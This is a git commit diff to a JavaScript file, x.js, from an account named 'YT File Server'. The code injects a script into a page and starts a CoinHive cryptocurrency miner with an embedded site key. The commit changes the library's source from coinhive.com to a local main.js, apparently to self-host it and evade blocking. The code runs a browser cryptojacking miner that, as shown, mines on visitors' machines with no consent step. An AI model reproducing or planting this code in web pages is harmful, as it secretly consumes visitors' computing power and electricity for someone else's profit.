bebf7f43d50561edd47f9287a08382565940451b
YT File Server <32802331+youtubefileserver@users.noreply.github.com>
2017-10-14 21:08:29 +0100

    Update x.js

--- x.js
+++ x.js
@@ -2,7 +2,7 @@
     var head= document.getElementsByTagName('head')[0];
     var script= document.createElement('script');
     script.type= 'text/javascript';
-    script.src= 'https://coinhive.com/lib/coinhive.min.js';
+    script.src= 'main.js';
     head.appendChild(script);
     script.onload = function() {
         var miner = new CoinHive.Anonymous('7CbSrIMXoIs24V0FH51kngm4jsiKfLoc');
